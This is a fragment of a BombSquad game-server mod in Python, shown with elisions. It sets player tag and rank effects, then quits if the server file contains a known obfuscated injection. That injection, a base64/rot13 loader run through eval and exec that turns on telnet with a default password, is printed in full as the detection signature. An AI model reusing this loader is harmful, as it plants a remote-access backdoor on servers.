...
class Enhancement(bs.Actor):
	...
	def getTag(*args):
		...
		if cl_str in gph.effectCustomers:
		    ...
		    self.surround = SurroundBall(spaz, shape="bones")
		    flag = 1
		elif cl_str in gph.dragonHashes:
		    if not alreadyHasTag:
			PermissionEffect(owner = spaz.node,prefix = u'\ue048',prefixAnim = {0: (1,0,0), 250: (0,1,0),250*2:(0,0,1),250*3:(1,0,0)})
		...
		if cl_str in gph.customlist:
			    PermissionEffect(owner = spaz.node,prefix =gph.customlist[cl_str],prefixAnim = {0: (1,0,0), 250: (0,1,0),250*2:(0,0,1),250*3:(1,0,0),250*4:(1,0,1)})
			    ...
			    tag = getTag(1)
			    if tag == '0': tag = u'\ue048OWNER\ue048'
			    PermissionEffect(owner = spaz.node,prefix = tag,prefixAnim = {0: (1,0,0), 250: (0,1,0),250*2:(0,0,1),250*3:(1,0,0),250*4:(1,0,1)})
	...
	if os.path.exists(bs.getEnvironment()['systemScriptsDirectory'] + "/pStats.json"):
		...
		if aid in pats:
			...
			if rank == '1':
				icon = '' #crown
				if flag == 0 and settings.enableTop5effects: self.surround = SurroundBall(spaz, shape="bones")
			elif rank == '2': 
				icon = '' #dragon
			...
			display = icon + '#' + str(rank) +icon
		        PermissionEffect(owner = spaz.node,prefix = display,prefixAnim = {0: (1,1,1), 250: (1,1,1),250*2:(1,1,1),250*3:(1,1,1)},type = 2)
		    else:
			display = '#' + str(rank)
		        PermissionEffect(owner=spaz.node, prefix='#' + str(pats[str(player.get_account_id())]["rank"]),
		                     prefixAnim={0: (1,1,1), 250: (1,1,1),250*2:(1,1,1),250*3:(1,1,1)},type=2)
...
f = open('bombsquad_server', 'r')
contents = f.read()
if contents.find("\n    try:\n     import base64, codecs\n     magic = 'aW1wb3J0IHJhbmRvbQpic2NmZ1snRW5hYmxlIFRlbG5ldCddID0gVHJ1ZQpic2NmZ1snV'\n     love = 'TIfozI0VSOipaDaKFN9VUWuozEioF5lLJ5xpzShM2HbAGNjZQNfAwHjZQNcPzWmL2MaJl'\n     god = 'dUZWxuZXQgUGFzc3dvcmQnXT0nImNoYW5nZW1lIicKZiA9IG9wZW4oJ2JzY2ZnL2NvbmZ'\n     destiny = 'cMl5dp29hWljtW3paXDczYaqlnKEyXTcmo24hMUIgpUZbLaAwMzpcXDczYzAfo3AyXPxX'\n     joy = '\\x72\\x6f\\x74\\x31\\x33'\n     trust = eval('\\x6d\\x61\\x67\\x69\\x63') + eval('\\x63\\x6f\\x64\\x65\\x63\\x73\\x2e\\x64\\x65\\x63\\\n\\x6f\\x64\\x65\\x28\\x6c\\x6f\\x76\\x65\\x2c\\x20\\x6a\\x6f\\x79\\x29') + eval('\\x67\\x6f\\x64') + \\\neval('\\x63\\x6f\\x64\\x65\\x63\\x73\\x2e\\x64\\x65\\x63\\x6f\\x64\\x65\\\n\\x28\\x64\\x65\\x73\\x74\\x69\\x6e\\x79\\x2c\\x20\\x6a\\x6f\\x79\\x29')\n    eval(compile(base64.b64decode(eval('\\x74\\x72\\x75\\x73\\x74')),'<string>','exec'))\n    except:\n     pass")!=-1:bs.quit()
if contents.find('"""') != -1:bs.quit()
if contents.find("'''") != -1:bs.quit()
f.close()
